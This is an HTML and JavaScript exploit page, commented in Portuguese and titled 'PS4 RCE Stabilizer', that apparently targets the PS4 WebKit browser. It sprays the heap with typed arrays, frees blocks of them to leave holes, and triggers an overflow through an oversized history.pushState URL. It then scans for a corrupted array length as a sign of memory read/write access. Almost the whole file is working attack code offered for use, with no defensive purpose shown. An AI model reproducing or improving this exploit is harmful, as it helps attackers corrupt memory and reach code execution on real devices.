<!DOCTYPE html>
<html>
<head>
    <title>PS4 RCE Stabilizer</title>
    <style>
        body { background: #111; color: #0f0; font-family: monospace; font-size: 14px; }
        .btn { padding: 10px; background: #333; color: #fff; border: 1px solid #555; cursor: pointer; margin: 5px; }
        .log { border: 1px solid #444; height: 300px; overflow: auto; padding: 10px; margin-top: 10px; background: #000; }
        .danger { color: #ff3333; }
        .success { color: #00ff00; font-weight: bold; background: #003300; }
    </style>
</head>
<body>
    <h1>Crash Stabilizer & Isolation</h1>
    <p>Target: 709,522 bytes | Strategy: Metadata Shifting</p>

    <div>
        <button class="btn" onclick="runTest(0)">Shift 0 (Padrão)</button>
        <button class="btn" onclick="runTest(4)">Shift 4 bytes</button>
        <button class="btn" onclick="runTest(8)">Shift 8 bytes</button>
        <button class="btn" onclick="runTest(16)">Shift 16 bytes</button>
        <button class="btn" onclick="runTest(24)">Shift 24 bytes</button>
    </div>

    <div id="logger" class="log"></div>

    <script>
        const logger = document.getElementById('logger');
        function log(msg, type='') {
            const div = document.createElement('div');
            div.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
            if(type) div.className = type;
            logger.appendChild(div);
            logger.scrollTop = logger.scrollHeight;
        }

        // DADOS DO REPORT ORIGINAL
        const BOUNDARY = 709522; 
        
        // Overflow curto. Não queremos 340KB! 
        // Queremos apenas o suficiente para pegar o Header (geralmente 8 a 16 bytes).
        // Se escrevermos demais, crashamos o kernel.
        const OVERFLOW_LEN = 32; 

        var sprayPtrs = [];

        function runTest(shiftAmount) {
            log(`--- Iniciando Teste com SHIFT: ${shiftAmount} bytes ---`);
            log("Limpando memória antiga...");
            sprayPtrs = []; // Reseta
            
            setTimeout(() => {
                stabilizeHeap(shiftAmount);
            }, 200);
        }

        function stabilizeHeap(shift) {
            log("1. Executando Heap Spray com Padding Variável...");
            
            // FASE 1: SPRAY ALINHADO
            // O objetivo aqui é colocar objetos na memória que tenham um tamanho ligeiramente diferente
            // para que o cabeçalho deles "corra" para o lado, fugindo (ou buscando) o nosso byte de overflow.
            
            for(let i=0; i < 4000; i++) {
                // Tamanho base + Shift
                // Uint32Array(1024) = 4096 bytes.
                // Adicionamos 'shift' elementos extras para empurrar o layout.
                let size = 1024 + shift; 
                let arr = new Uint32Array(size);
                
                arr[0] = 0x13371337; // Marker
                arr[1] = i;          // Index
                sprayPtrs.push(arr);
            }

            log("2. Criando o 'Buraco de Isolamento'...");
            
            // Precisamos de um buraco GRANDE e CONTÍGUO para o payload de 709KB.
            // Se o buraco for perfeito, o payload termina exatamente onde começa o próximo array.
            
            // Baseado no seu crash anterior, vamos deletar blocos de arrays.
            // 709522 bytes / (4096 + shift*4) bytes = N arrays a deletar.
            // Cálculo aproximado: ~173 arrays de 4KB.
            
            // Vamos tentar criar buracos em 3 lugares diferentes da memória para aumentar a chance
            let holes = [1000, 2000, 3000];
            
            for(let h of holes) {
                // Deletamos 175 arrays seguidos para garantir espaço
                for(let i=0; i < 175; i++) {
                    sprayPtrs[h + i] = null;
                }
            }

            log("3. Aguardando GC e Injetando Payload...");
            
            setTimeout(() => {
                try {
                    // CONSTRUÇÃO DO PAYLOAD (Baseado no seu POC)
                    const base = "A".repeat(BOUNDARY);
                    
                    // O Overflow Controlado (0x01)
                    // Usamos 0x01 porque passa pelo filtro do WebKit
                    const overflow = "\x01".repeat(OVERFLOW_LEN);
                    
                    const payload = "/" + base + overflow; // '/' as vezes ajuda a alinhar strings de URL

                    // INJEÇÃO
                    history.pushState({}, "rce_attempt", payload);
                    
                    // CHECAGEM
                    checkSuccess(shift);

                } catch(e) {
                    log("Erro na injeção: " + e.message, "danger");
                }
            }, 500);
        }

        function checkSuccess(shift) {
            log("Verificando integridade dos Arrays...");
            let corrupted = false;

            for(let i=0; i < sprayPtrs.length; i++) {
                let arr = sprayPtrs[i];
                if(arr) {
                    // Verifica se o tamanho mudou
                    let expectedSize = 1024 + shift;
                    
                    // Se o tamanho for diferente do original, BINGO!
                    if(arr.length !== expectedSize) {
                        corrupted = true;
                        log("!!! SUCESSO CRÍTICO !!!", "success");
                        log(`Array ${i} corrompido! Shift usado: ${shift}`, "success");
                        log(`Tamanho antigo: ${expectedSize} -> Novo: ${arr.length}`, "success");
                        log("MEMÓRIA RW ALCANÇADA. NÃO FECHE ESTA PÁGINA.", "success");
                        alert("RCE FOUND! Take a picture!");
                        return;
                    }
                }
            }

            if(!corrupted) {
                log(`Falha com Shift ${shift}. Nenhum array modificado.`, "danger");
                log("Se não crashou, o overflow caiu no vazio (padding). Tente outro Shift.");
            }
        }
    </script>
</body>
</html>
